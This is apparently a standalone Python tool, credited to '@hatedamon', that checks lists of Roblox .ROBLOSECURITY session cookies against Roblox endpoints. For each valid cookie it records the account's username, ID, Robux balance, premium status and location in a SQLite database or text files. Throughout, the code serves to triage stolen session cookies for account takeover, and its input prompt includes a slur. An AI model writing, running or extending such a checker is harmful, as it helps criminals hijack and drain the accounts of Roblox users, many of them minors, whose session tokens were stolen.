import os
import requests
from pathlib import Path
from colorama import Fore, Style, init
import logging
import sqlite3

IDIR = "input"
ODIR = "output"
DATABASE_FILE = "./data/cookies.db"

A = """
Author: @hatedamon
          \            /
           \    __    /
____________\.-|__|-./____________
    + + ---\__| \/ |__/--- + +
               \__/
"""

init(autoreset=True)

class ColorHandler(logging.StreamHandler):
    def emit(self, record):
        color = Fore.WHITE
        if record.levelno == logging.DEBUG:
            color = Fore.BLUE
        elif record.levelno == logging.INFO:
            color = Fore.GREEN
        elif record.levelno == logging.WARNING:
            color = Fore.YELLOW
        elif record.levelno == logging.ERROR:
            color = Fore.RED
        record.msg = f"{color}{record.msg}{Style.RESET_ALL}"
        super().emit(record)

def configure_logging():
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)

    # remove handlers
    for handler in logger.handlers[:]:
        logger.removeHandler(handler)

    # custom handler
    handler = ColorHandler()
    formatter = logging.Formatter('%(message)s')
    handler.setFormatter(formatter)
    logger.addHandler(handler)

def main():
    configure_logging()
    logger = logging.getLogger()
    print(Fore.CYAN + A)
    save_to_db = prompt_for_db_usage()
    setup_directories()
    if save_to_db:
        setup_database()
    files = list(Path(IDIR).glob("*.txt"))
    tf = len(files)
    logger.info(f"num found: {tf}")
    for idx, file in enumerate(files, start=1):
        logger.info(f"processing file {idx}/{tf}: {file.name}")
        process(file, save_to_db)
        logger.info(f"processed {idx}/{tf}")
    logger.info(f"all files processed")

def prompt_for_db_usage():
    while True:
        user_input = input("would you like to save info into a database? (yes/no): ").strip().lower()
        if user_input in ['yes', 'no']:
            return user_input == 'yes'
        else:
            print("god you're retarded...")

def setup_directories():
    os.makedirs(ODIR, exist_ok=True)
    logger = logging.getLogger()
    logger.info(f"input dir: {IDIR}")
    logger.info(f"output dir: {ODIR}")

def setup_database():
    os.makedirs(os.path.dirname(DATABASE_FILE), exist_ok=True)
    with sqlite3.connect(DATABASE_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS cookies (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            user_id TEXT,
                            username TEXT,
                            robux_balance TEXT,
                            is_premium TEXT,
                            location TEXT,
                            cookie TEXT,
                            status TEXT)''')
        conn.commit()
    logger = logging.getLogger()
    logger.info(f"db setup completed: {DATABASE_FILE}")

def process(file_path, save_to_db):
    with file_path.open('r') as file:
        for line in file:
            cookie = line.strip()
            if cookie:
                validate(cookie, save_to_db)

def validate(cookie, save_to_db):
    logger = logging.getLogger()
    try:
        response = requests.get("https://roblox.com/login", cookies={".ROBLOSECURITY": cookie})
        if response.status_code == 200:
            collect_data(cookie, save_to_db)
        else:
            save_to_txt(cookie, "expired")
    except requests.RequestException as e:
        logger.error(f"er making req: {e}")
        save_to_txt(cookie, "expired")

def collect_data(cookie, save_to_db):
    logger = logging.getLogger()
    try:
        response = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie})
        if response.status_code == 200:
            user_data = response.json()
            if save_to_db:
                save_to_db_func(cookie, user_data)
            else:
                save_to_txt(cookie, "valid")
        else:
            save_to_txt(cookie, "expired")
    except requests.RequestException as e:
        logger.error(f"err collecting data: {e}")
        save_to_txt(cookie, "expired")

def save_to_db_func(cookie, user_data):
    logger = logging.getLogger()
    location_response = requests.get("https://auth.roblox.com/v1/auth/metadata", cookies={".ROBLOSECURITY": cookie})
    if location_response.status_code == 200:
        location = location_response.headers.get("x-roblox-edge", "Unknown")
    else:
        location = "Unknown"

    user_id = user_data.get("UserID", "Unknown")
    username = user_data.get("UserName", "Unknown")
    robux_balance = user_data.get("RobuxBalance", "Unknown")
    is_premium = user_data.get("IsPremium", "Unknown")

    with sqlite3.connect(DATABASE_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("INSERT INTO cookies (user_id, username, robux_balance, is_premium, location, cookie, status) VALUES (?, ?, ?, ?, ?, ?, ?)",
                       (user_id, username, robux_balance, is_premium, location, cookie, "valid"))
        conn.commit()
    logger.info(f"cookie data saved to db for user: {username}")

def save_to_txt(cookie, status):
    output_file = Path(ODIR) / f"{status}.txt"
    with output_file.open('a') as file:
        file.write(cookie + "\n")

if __name__ == "__main__":
    main()
